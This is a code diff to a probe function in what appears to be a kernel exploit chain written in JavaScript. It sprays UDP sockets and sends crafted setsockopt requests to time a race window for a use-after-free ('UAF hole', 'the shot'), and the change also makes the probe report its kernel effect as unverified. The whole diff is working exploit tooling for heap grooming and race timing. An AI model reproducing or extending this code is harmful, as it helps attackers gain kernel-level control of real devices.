@@ -1916,6 +1916,32 @@ export function probeAfterglow(ctx) {
   const socks = [];
   out.udp = 0;
   try {
+    /* Match the shot's request exactly. A blank sockaddr is not a useful
+       check of the socket option path, even when timing happens to work. */
+    const body = alloc(TUNE.object); body.u8.fill(0);
+    const sockaddr = alloc(16);
+    sockaddr.u8.set([16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1]);
+    const req = alloc(40);
+    req.dv.setUint32(0, 1, true);
+    pokeAt(req, 8, sockaddr.at);
+    req.dv.setUint32(16, 16, true);
+    pokeAt(req, 24, body.at);
+    req.dv.setUint32(32, TUNE.object, true);
+
+    /* Observe a first call on a separate socket. The earlier probe counted
+       second calls on sprayed sockets; one-shot option semantics made that
+       count inconclusive. This call is not a pass/fail gate: a return code
+       alone cannot prove whether a kernel allocation happened. */
+    const canary = sc(S.socket, 2, 2, 0).i32;
+    if (canary >= 0) {
+      try {
+        const rv = sc(S.setsockopt, canary, 17, 128, req.at, 40).i32;
+        out.optionFirst = "rc=" + rv + (rv === 0 ? "" : " errno=" + host().errno());
+      } finally {
+        if (sc(S.close, canary).i32 !== 0) no("canary socket close failed");
+      }
+    } else out.optionFirst = "socket unavailable, errno=" + host().errno();
+
     for (let i = 0; i < TUNE.sprays; i++) {
       const fd = sc(S.socket, 2, 2, 0).i32;
       if (fd < 0) break;
@@ -1923,16 +1949,9 @@ export function probeAfterglow(ctx) {
     }
     out.udp = socks.length;
 
-    /* Setting this option allocates in the same zone, but no APM clone has
-       been freed, so there is no UAF hole to win. */
+    /* No APM clone has been freed, so there is no UAF hole to win. These
+       calls match the shot's timing, but allocation effect is unverified. */
     if (socks.length) {
-      const body = alloc(TUNE.object); body.u8.fill(0);
-      const req = alloc(40);
-      req.dv.setUint32(0, 1, true);
-      pokeAt(req, 8, alloc(16).at);
-      req.dv.setUint32(16, 16, true);
-      pokeAt(req, 24, body.at);
-      req.dv.setUint32(32, TUNE.object, true);
       const stub = stubFor(S.setsockopt);
       const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
       let t0, t1;
@@ -1945,11 +1964,13 @@ export function probeAfterglow(ctx) {
           catch (e) { fertig.length = 0; break; }
         }
         if (fertig.length) {
-          host().runPrepared(fertig[0]);
+          host().runPrepared(host().prepareMany([[stubFor(S.getuid), []]]));
+          const lastReturns = [];
           t0 = performance.now();
-          for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
+          for (let i = 0; i < fertig.length; i++) lastReturns.push(host().runPrepared(fertig[i]).i32);
           t1 = performance.now();
           out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
+          out.batchLastReturns = lastReturns.join(",");
         }
       }
       if (out.window === undefined) {
@@ -1958,12 +1979,6 @@ export function probeAfterglow(ctx) {
         t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
         out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
       }
-      let accepted = 0;
-      for (let i = 0; i < socks.length; i++)
-        if (sc(S.setsockopt, socks[i], 17, 128, req.at, 40).i32 === 0) accepted++;
-      out.optionsAccepted = accepted;
-      if (accepted < TUNE.sprays)
-        no("only " + accepted + " socket options succeeded, " + TUNE.sprays + " needed");
     } else out.window = "not measured";
     if (socks.length < TUNE.sprays)
       no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
@@ -1997,9 +2012,11 @@ export function probeAfterglow(ctx) {
   say("probe restore " + (out.pinRestored ? "original CPU affinity" : "FAILED"));
   say("probe window " + out.window);
   say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
-  say("probe option " + (out.optionsAccepted || 0) + " of " + TUNE.sprays + " succeeded");
+  say("probe option first " + (out.optionFirst || "not run"));
+  say("probe batch last " + (out.batchLastReturns || "not measured"));
+  say("probe allocation effect unverified");
   say("probe SHOTS  " + out.units + " units, a run needs 3");
-  if (out.ok) say("probe VERDICT usable");
+  if (out.ok) say("probe VERDICT device access passed; kernel effect unverified");
   else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
   return out;
 }
